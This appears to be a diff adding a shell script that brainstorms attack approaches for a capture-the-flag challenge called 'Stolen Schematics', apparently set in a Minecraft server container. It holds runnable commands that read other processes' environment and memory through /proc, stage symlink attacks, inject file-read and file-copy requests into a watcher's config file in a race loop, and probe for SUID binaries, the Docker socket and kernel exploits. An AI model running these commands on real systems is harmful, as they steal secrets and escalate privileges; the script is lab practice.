@@ -1,0 +1,91 @@
+# STOLEN SCHEMATICS - Alternative Approaches
+# Since registry tags don't exist, try these:
+
+echo "=== APPROACH 1: Find the flag in the container ==="
+# Flag might be somewhere else, not /etc/flag.txt
+find / -type f -name "*flag*" 2>/dev/null | grep -v proc | grep -v sys
+find / -type f -readable 2>/dev/null | xargs grep -l "TDHT{" 2>/dev/null | head -20
+
+echo -e "\n=== APPROACH 2: Check environment variables ==="
+# Maybe FLAG is in environment
+env | grep -i flag
+env | grep -i tdht
+env | grep -i CTF
+
+# Check watcher's environment
+cat /proc/16/environ 2>/dev/null | tr '\0' '\n' | grep -i flag
+strings /proc/16/environ 2>/dev/null
+
+echo -e "\n=== APPROACH 3: Check if sync-loop.sh can be read differently ==="
+# Maybe we can read it via /proc
+cat /proc/16/exe 2>/dev/null
+ls -la /proc/16/fd/ 2>/dev/null
+cat /proc/16/cmdline 2>/dev/null | tr '\0' ' '
+
+# Try to read bash history or script content from memory
+strings /proc/16/maps 2>/dev/null | grep -i flag
+
+echo -e "\n=== APPROACH 4: Symlink attack ==="
+# Create symlink to flag and trigger watcher to read it
+mkdir -p /tmp/exploit 2>/dev/null
+cd /tmp/exploit
+ln -sf /etc/flag.txt flag.txt 2>/dev/null
+ln -sf /opt/mc/scripts/sync-loop.sh stolen.sh 2>/dev/null
+ls -la
+
+echo -e "\n=== APPROACH 5: Check Minecraft server logs for secrets ==="
+cat /opt/mc/logs/latest.log | grep -i TDHT
+cat /opt/mc/logs/latest.log | grep -i flag
+cat /opt/mc/logs/latest.log | tail -100
+
+echo -e "\n=== APPROACH 6: Look for SUID exploits ==="
+find / -perm -4000 -type f 2>/dev/null
+# Check if any allow reading as root
+
+echo -e "\n=== APPROACH 7: Race condition - write rapidly ==="
+# Maybe the watcher IS processing but we need to catch it
+for i in {1..10}; do
+    echo "talldwarf-sync-command=FILE-READ:/etc/flag.txt" > /opt/mc/config/sync-request.conf
+    sleep 0.1
+    cat /opt/mc/.sync/sync.result 2>/dev/null && break
+    cat /tmp/*.txt 2>/dev/null | grep TDHT && break
+done
+
+echo -e "\n=== APPROACH 8: Check if the challenge name is a hint ==="
+# "Stolen Schematics" - maybe we need to exfiltrate the script itself?
+# Try to copy sync-loop.sh by exploiting the watcher
+cat > /opt/mc/config/sync-request.conf << 'EOF'
+COPY_SOURCE=/opt/mc/scripts/sync-loop.sh
+COPY_DEST=/tmp/stolen.sh
+EOF
+sleep 5
+cat /tmp/stolen.sh 2>/dev/null
+
+echo -e "\n=== APPROACH 9: Check for secrets in other scripts ==="
+find /opt/mc -type f -name "*.sh" 2>/dev/null
+cat /entrypoint.sh 2>/dev/null | grep -i flag
+cat /bin/entrypoint.sh 2>/dev/null | grep -i flag
+
+echo -e "\n=== APPROACH 10: Maybe flag is in the watcher process memory ==="
+# This requires gdb or similar (probably not available)
+grep -a TDHT /proc/16/maps 2>/dev/null
+strings /proc/16/mem 2>/dev/null | grep TDHT | head -5
+
+echo -e "\n=== APPROACH 11: Check Docker socket ==="
+# If Docker socket is mounted, we might access host
+ls -la /var/run/docker.sock 2>/dev/null
+docker ps 2>/dev/null
+
+echo -e "\n=== APPROACH 12: Kernel exploits ==="
+uname -a
+cat /proc/version
+# Look for CVEs for this kernel version
+
+echo -e "\n=== FINAL: What 2 teams found ==="
+echo "Since 2 teams solved this, there IS a solution."
+echo "Most likely approaches:"
+echo "1. Flag is in an unexpected location in the container"
+echo "2. Timing/race condition with the watcher"
+echo "3. Alternative registry access method"
+echo "4. Process memory extraction"
+echo "5. Different interpretation of 'Stolen Schematics'"
